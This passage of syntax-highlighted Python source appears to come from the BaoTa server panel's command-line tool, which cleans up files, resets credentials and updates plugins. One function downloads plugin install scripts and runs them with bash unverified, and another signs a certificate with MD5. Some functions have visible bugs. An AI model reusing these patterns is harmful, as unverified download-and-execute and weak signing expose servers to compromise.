<span class="keyword">in</span> [<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\033[1;41m|-面板初始化地址: http://&#123;SERVERIP&#125;:&#x27;</span>+port+<span class="string">&#x27;/install\033[0m&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\033[1;41m|-获取初始帐号密码命令:bt default \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清空正在执行的任务</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CloseTask</span>():</span><br><span class="line">    ncount = public.M(<span class="string">&#x27;tasks&#x27;</span>).where(<span class="string">&#x27;status!=?&#x27;</span>,(<span class="number">1</span>,)).delete()</span><br><span class="line">    os.system(<span class="string">&quot;kill `ps -ef |grep &#x27;python panelSafe.pyc&#x27;|grep -v grep|grep -v panelExec|awk &#x27;&#123;print $2&#125;&#x27;`&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;kill `ps -ef |grep &#x27;install_soft.sh&#x27;|grep -v grep|grep -v panelExec|awk &#x27;&#123;print $2&#125;&#x27;`&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;/etc/init.d/bt restart&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功清理 &quot;</span> + <span class="built_in">int</span>(ncount) + <span class="string">&quot; 个任务!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自签证书</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateSSL</span>():</span><br><span class="line">    <span class="keyword">import</span> OpenSSL</span><br><span class="line">    key = OpenSSL.crypto.PKey()</span><br><span class="line">    key.generate_key( OpenSSL.crypto.TYPE_RSA, <span class="number">2048</span> )</span><br><span class="line">    cert = OpenSSL.crypto.X509()</span><br><span class="line">    cert.set_serial_number(<span class="number">0</span>)</span><br><span class="line">    cert.get_subject().CN = public.GetLocalIp()</span><br><span class="line">    cert.set_issuer(cert.get_subject())</span><br><span class="line">    cert.gmtime_adj_notBefore( <span class="number">0</span> )</span><br><span class="line">    cert.gmtime_adj_notAfter( <span class="number">10</span>*<span class="number">365</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span> )</span><br><span class="line">    cert.set_pubkey( key )</span><br><span class="line">    cert.sign( key, <span class="string">&#x27;md5&#x27;</span> )</span><br><span class="line">    cert_ca = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)</span><br><span class="line">    private_key = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cert_ca) &gt; <span class="number">100</span> <span class="keyword">and</span> <span class="built_in">len</span>(private_key) &gt; <span class="number">100</span>:</span><br><span class="line">        public.writeFile(<span class="string">&#x27;ssl/certificate.pem&#x27;</span>,cert_ca)</span><br><span class="line">        public.writeFile(<span class="string">&#x27;ssl/privateKey.pem&#x27;</span>,private_key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateFiles</span>(<span class="params">path,num</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): os.system(<span class="string">&#x27;mkdir -p &#x27;</span> + path)</span><br><span class="line">    <span class="keyword">import</span> time;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        filename = path + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(time.time()) + <span class="string">&#x27;__&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="built_in">open</span>(path,<span class="string">&#x27;w+&#x27;</span>).close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算文件数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFilesCount</span>(<span class="params">path</span>):</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> os.listdir(path): i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#清理系统垃圾</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ClearSystem</span>():</span><br><span class="line">    count = total = <span class="number">0</span></span><br><span class="line">    tmp_total,tmp_count = ClearMail()</span><br><span class="line">    count += tmp_count</span><br><span class="line">    total += tmp_total</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=======================================================================&#x27;</span>)</span><br><span class="line">    tmp_total,tmp_count = ClearSession()</span><br><span class="line">    count += tmp_count</span><br><span class="line">    total += tmp_total</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=======================================================================&#x27;</span>)</span><br><span class="line">    tmp_total,tmp_count = ClearOther()</span><br><span class="line">    count += tmp_count</span><br><span class="line">    total += tmp_total</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=======================================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;32m|-系统垃圾清理完成，共删除[&#x27;</span>+<span class="built_in">str</span>(count)+<span class="string">&#x27;]个文件,释放磁盘空间[&#x27;</span>+ToSize(total)+<span class="string">&#x27;]\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清理邮件日志</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ClearMail</span>():</span><br><span class="line">    rpath = <span class="string">&#x27;/var/spool&#x27;</span></span><br><span class="line">    total = count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">import</span> shutil</span><br><span class="line">    con = [<span class="string">&#x27;cron&#x27;</span>,<span class="string">&#x27;anacron&#x27;</span>,<span class="string">&#x27;mail&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> os.listdir(rpath):</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">in</span> con: <span class="keyword">continue</span></span><br><span class="line">        dpath = rpath + <span class="string">&#x27;/&#x27;</span> + d</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理&#x27;</span> + dpath + <span class="string">&#x27; ...&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        num = size = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> os.listdir(dpath):</span><br><span class="line">            filename = dpath + <span class="string">&#x27;/&#x27;</span> + n</span><br><span class="line">            fsize = os.path.getsize(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;|---[&#x27;</span>+ToSize(fsize)+<span class="string">&#x27;] del &#x27;</span> + filename),</span><br><span class="line">            size += fsize</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(filename):</span><br><span class="line">                shutil.rmtree(filename)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.remove(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[OK]\033[0m&#x27;</span>)</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;|-已清理[&#x27;</span>+dpath+<span class="string">&#x27;],删除[&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;]个文件,共释放磁盘空间[&#x27;</span>+ToSize(size)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        total += size</span><br><span class="line">        count += num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=======================================================================&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-已完成spool的清理，删除[&#x27;</span>+<span class="built_in">str</span>(count)+<span class="string">&#x27;]个文件,共释放磁盘空间[&#x27;</span>+ToSize(total)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> total,count</span><br><span class="line"></span><br><span class="line"><span class="comment">#清理php_session文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ClearSession</span>():</span><br><span class="line">    spath = <span class="string">&#x27;/tmp&#x27;</span></span><br><span class="line">    total = count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">import</span> shutil</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理PHP_SESSION ...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> os.listdir(spath):</span><br><span class="line">        <span class="keyword">if</span> d.find(<span class="string">&#x27;sess_&#x27;</span>) == -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">        filename = spath + <span class="string">&#x27;/&#x27;</span> + d</span><br><span class="line">        fsize = os.path.getsize(filename)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;|---[&#x27;</span>+ToSize(fsize)+<span class="string">&#x27;] del &#x27;</span> + filename),</span><br><span class="line">        total += fsize</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(filename):</span><br><span class="line">            shutil.rmtree(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.remove(filename)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[OK]\033[0m&#x27;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-已完成php_session的清理，删除[&#x27;</span>+<span class="built_in">str</span>(count)+<span class="string">&#x27;]个文件,共释放磁盘空间[&#x27;</span>+ToSize(total)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> total,count</span><br><span class="line"></span><br><span class="line"><span class="comment">#清空回收站</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ClearRecycle_Bin</span>():</span><br><span class="line">    <span class="keyword">import</span> files</span><br><span class="line">    f = files.files()</span><br><span class="line">    f.Close_Recycle_bin(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#清理其它</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ClearOther</span>():</span><br><span class="line">    clearPath = [</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/www/server/panel&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;testDisk_&#x27;</span>&#125;,</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/www/wwwlogs&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;log&#x27;</span>&#125;,</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/tmp&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;panelBoot.pl&#x27;</span>&#125;,</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/www/server/panel/install&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;.rpm&#x27;</span>&#125;,</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/www/server/panel/install&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;.zip&#x27;</span>&#125;,</span><br><span class="line">                 &#123;<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;/www/server/panel/install&#x27;</span>,<span class="string">&#x27;find&#x27;</span>:<span class="string">&#x27;.gz&#x27;</span>&#125;</span><br><span class="line">                 ]</span><br><span class="line"></span><br><span class="line">    total = count = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-正在清理临时文件及网站日志 ...&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> clearPath:</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> os.listdir(c[<span class="string">&#x27;path&#x27;</span>]):</span><br><span class="line">            <span class="keyword">if</span> d.find(c[<span class="string">&#x27;find&#x27;</span>]) == -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">            filename = c[<span class="string">&#x27;path&#x27;</span>] + <span class="string">&#x27;/&#x27;</span> + d</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(filename): <span class="keyword">continue</span></span><br><span class="line">            fsize = os.path.getsize(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;|---[&#x27;</span>+ToSize(fsize)+<span class="string">&#x27;] del &#x27;</span> + filename),</span><br><span class="line">            total += fsize</span><br><span class="line">            os.remove(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\t\033[1;32m[OK]\033[0m&#x27;</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    public.serviceReload()</span><br><span class="line">    os.system(<span class="string">&#x27;sleep 1 &amp;&amp; /etc/init.d/bt reload &gt; /dev/null &amp;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;|-已完成临时文件及网站日志的清理，删除[&#x27;</span>+<span class="built_in">str</span>(count)+<span class="string">&#x27;]个文件,共释放磁盘空间[&#x27;</span>+ToSize(total)+<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> total,count</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭普通日志</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CloseLogs</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        paths = [<span class="string">&#x27;/usr/lib/python2.7/site-packages/web/httpserver.py&#x27;</span>,<span class="string">&#x27;/usr/lib/python2.6/site-packages/web/httpserver.py&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path): <span class="keyword">continue</span></span><br><span class="line">            hsc = public.readFile(path)</span><br><span class="line">            <span class="keyword">if</span> hsc.find(<span class="string">&#x27;500 Internal Server Error&#x27;</span>) != -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">            rstr = <span class="string">&#x27;&#x27;&#x27;def log(self, status, environ):</span></span><br><span class="line"><span class="string">        if status != &#x27;500 Internal Server Error&#x27;: return;&#x27;&#x27;&#x27;</span></span><br><span class="line">            hsc = hsc.replace(<span class="string">&quot;def log(self, status, environ):&quot;</span>,rstr)</span><br><span class="line">            <span class="keyword">if</span> hsc.find(<span class="string">&#x27;500 Internal Server Error&#x27;</span>) == -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            public.writeFile(path,hsc)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字节单位转换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ToSize</span>(<span class="params">size</span>):</span><br><span class="line">    ds = [<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;KB&#x27;</span>,<span class="string">&#x27;MB&#x27;</span>,<span class="string">&#x27;GB&#x27;</span>,<span class="string">&#x27;TB&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> ds:</span><br><span class="line">        <span class="keyword">if</span> size &lt; <span class="number">1024</span>: <span class="keyword">return</span> <span class="built_in">str</span>(size)+d</span><br><span class="line">        size = size / <span class="number">1024</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#随机面板用户名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_panel_username</span>(<span class="params">username = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">import</span> db</span><br><span class="line">    sql = db.Sql()</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，用户名长度不能少于3位&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> [<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;root&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，不能使用过于简单的用户名&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;username&#x27;</span>,username)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-新用户名: %s&quot;</span> % username)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    username = sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).getField(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        username = public.GetRandomString(<span class="number">8</span>).lower()</span><br><span class="line">        sql.table(<span class="string">&#x27;users&#x27;</span>).where(<span class="string">&#x27;id=?&#x27;</span>,(<span class="number">1</span>,)).setField(<span class="string">&#x27;username&#x27;</span>,username)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;username: &#x27;</span> + username)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设定idc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_idc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        panelPath = <span class="string">&#x27;/www/server/panel&#x27;</span></span><br><span class="line">        filename = panelPath + <span class="string">&#x27;/data/o.pl&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        o = public.readFile(filename).strip()</span><br><span class="line">        c_url = <span class="string">&#x27;http://www.bt.cn/api/idc/get_idc_info_bycode?o=%s&#x27;</span> % o</span><br><span class="line">        idcInfo = json.loads(public.httpGet(c_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> idcInfo[<span class="string">&#x27;status&#x27;</span>]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        pFile = panelPath + <span class="string">&#x27;/config/config.json&#x27;</span></span><br><span class="line">        pInfo = json.loads(public.readFile(pFile))</span><br><span class="line">        pInfo[<span class="string">&#x27;brand&#x27;</span>] = idcInfo[<span class="string">&#x27;msg&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        pInfo[<span class="string">&#x27;product&#x27;</span>] = <span class="string">u&#x27;与宝塔联合定制版&#x27;</span></span><br><span class="line">        public.writeFile(pFile,json.dumps(pInfo))</span><br><span class="line">        tFile = panelPath + <span class="string">&#x27;/data/title.pl&#x27;</span></span><br><span class="line">        titleNew = pInfo[<span class="string">&#x27;brand&#x27;</span>] + <span class="string">u&#x27;面板&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(tFile):</span><br><span class="line">            title = public.GetConfigValue(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> title == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> title == <span class="string">&#x27;宝塔Linux面板&#x27;</span>:</span><br><span class="line">                public.writeFile(tFile,titleNew)</span><br><span class="line">                public.SetConfigValue(<span class="string">&#x27;title&#x27;</span>,titleNew)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            public.writeFile(tFile,titleNew)</span><br><span class="line">            public.SetConfigValue(<span class="string">&#x27;title&#x27;</span>,titleNew)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将插件升级到6.0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_to6</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在升级插件...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====================================================&quot;</span>)</span><br><span class="line">    download_address = public.get_url()</span><br><span class="line">    exlodes = [<span class="string">&#x27;gitlab&#x27;</span>,<span class="string">&#x27;pm2&#x27;</span>,<span class="string">&#x27;mongodb&#x27;</span>,<span class="string">&#x27;deployment_jd&#x27;</span>,<span class="string">&#x27;logs&#x27;</span>,<span class="string">&#x27;docker&#x27;</span>,<span class="string">&#x27;beta&#x27;</span>,<span class="string">&#x27;btyw&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pname <span class="keyword">in</span> os.listdir(<span class="string">&#x27;plugin/&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">&#x27;plugin/&#x27;</span> + pname): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> pname <span class="keyword">in</span> exlodes: <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|-正在升级【%s】...&quot;</span> % pname),</span><br><span class="line">        download_url = download_address + <span class="string">&#x27;/install/plugin/&#x27;</span> + pname + <span class="string">&#x27;/install.sh&#x27;</span></span><br><span class="line">        to_file = <span class="string">&#x27;/tmp/%s.sh&#x27;</span> % pname</span><br><span class="line">        public.downloadFile(download_url,to_file)</span><br><span class="line">        os.system(<span class="string">&#x27;/bin/bash &#x27;</span> + to_file + <span class="string">&#x27; install &amp;&gt; /tmp/plugin_update.log 2&gt;&amp;1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;    \033[32m[成功]\033[0m&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[32m所有插件已成功升级到最新!\033[0m&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#命令行菜单</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bt_cli</span>(<span class="params">u_input = <span class="number">0</span></span>):</span><br><span class="line">    raw_tip = <span class="string">&quot;===============================================&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u_input:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;===============宝塔面板命令行==================&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(1) 重启面板服务           (8) 改面板端口&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(2) 停止面板服务           (9) 清除面板缓存&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(3) 启动面板服务           (10) 清除登录限制&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(4) 重载面板服务           (11) 取消入口限制&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(5) 修改面板密码           (12) 取消域名绑定限制&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(6) 修改面板用户名         (13) 取消IP访问限制&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(7) 强制修改MySQL密码      (14) 查看面板默认信息&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(22) 显示面板错误日志      (15) 清理系统垃圾&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(23) 关闭BasicAuth认证     (16) 修复面板(检查错误并更新面板文件到最新版)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(24) 关闭谷歌认证          (17) 设置日志切割是否压缩&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(25) 设置是否保存文件历史副本  (18) 设置是否自动备份面板&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(0) 取消&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(raw_tip)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            u_input = <span class="built_in">input</span>(<span class="string">&quot;请输入命令编号：&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span>: u_input = <span class="built_in">int</span>(u_input)</span><br><span class="line">        <span class="keyword">except</span>: u_input = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> u_input <span class="keyword">in</span> nums:</span><br><span class="line">        <span class="built_in">print</span>(raw_tip)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已取消!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(raw_tip)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在执行(%s)...&quot;</span> % u_input)</span><br><span class="line">    <span class="built_in">print</span>(raw_tip)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u_input == <span class="number">1</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/etc/init.d/bt restart&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">2</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/etc/init.d/bt stop&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">3</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/etc/init.d/bt start&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">4</span>:</span><br><span class="line">        os.system(<span class="string">&quot;/etc/init.d/bt reload&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            input_pwd = raw_input(<span class="string">&quot;请输入新的面板密码：&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            input_pwd = <span class="built_in">input</span>(<span class="string">&quot;请输入新的面板密码：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(input_pwd.strip()) &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，密码长度不能小于5位&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        set_panel_pwd(input_pwd.strip(),<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            input_user = raw_input(<span class="string">&quot;请输入新的面板用户名(&gt;3位)：&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            input_user = <span class="built_in">input</span>(<span class="string">&quot;请输入新的面板用户名(&gt;3位)：&quot;</span>)</span><br><span class="line">        set_panel_username(input_user.strip())</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            input_mysql = raw_input(<span class="string">&quot;请输入新的MySQL密码：&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            input_mysql = <span class="built_in">input</span>(<span class="string">&quot;请输入新的MySQL密码：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> input_mysql:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，不能设置空密码&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(input_mysql) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，长度不能少于8位&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        rep = <span class="string">r&quot;^[\w@\._]+$&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(rep, input_mysql):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;|-错误，密码中不能包含特殊符号&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(input_mysql)</span><br><span class="line">        set_mysql_root(input_mysql.strip())</span><br><span class="line">    <span class="keyword">elif</span> u_input == <span class="number">8</span>:</span><br><span class="line">        input_port = <span class="built_in">input</span>(<span class="string">&quot;请输入新的面板端口：&quot;</span>)</span><br><span class="line">  